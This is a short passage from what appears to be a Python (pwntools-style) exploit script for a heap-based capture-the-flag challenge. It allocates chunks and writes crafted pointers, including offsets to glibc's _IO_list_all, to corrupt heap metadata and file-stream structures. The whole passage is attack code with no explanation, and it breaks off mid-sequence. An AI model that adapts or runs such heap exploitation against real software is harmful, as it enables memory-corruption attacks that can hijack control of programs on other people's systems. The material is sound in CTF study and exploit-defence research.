...
add(4,0x88,"A")
add(3,0x98,"A")
add(1,0x48,p64(heap_address+1)*3+p64(0)+p64(heap_address)+p64(0x100)+p64(0x5557d20bd9a0-0x5557d20ab000+heap+0x10)+p64(0))
add(0,0x100,p64(0)+p64(libc.symbols['_IO_list_all']-0x10))
add(5,0x88,"A")
context.log_level='debug'
fio=0x55555576a460-0x555555758000+heap

add(1,0x48,p64(heap_address+1)*3+p64(0)+p64(libc.symbols['_IO_list_all'])+p64(0x200)+p64(fio)+p64(0))
